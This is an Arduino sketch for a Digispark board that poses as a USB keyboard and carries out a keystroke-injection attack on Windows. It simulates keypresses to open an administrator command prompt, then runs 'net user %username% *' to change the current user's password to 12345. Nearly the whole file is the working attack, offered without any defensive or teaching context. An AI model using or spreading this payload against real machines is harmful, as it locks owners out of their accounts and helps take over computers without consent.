#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  
  DigiKeyboard.sendKeyStroke(0);

  // Opens CMD in ADMIN
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Makes it green, cause why not
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("color 0a");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // changes password to 12345
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("net user %username% *");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1);
  DigiKeyboard.print("12345");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1);
  DigiKeyboard.print("12345");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // exits CMD
  DigiKeyboard.delay(10);
 // DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(100000000000000);
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)

  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
}
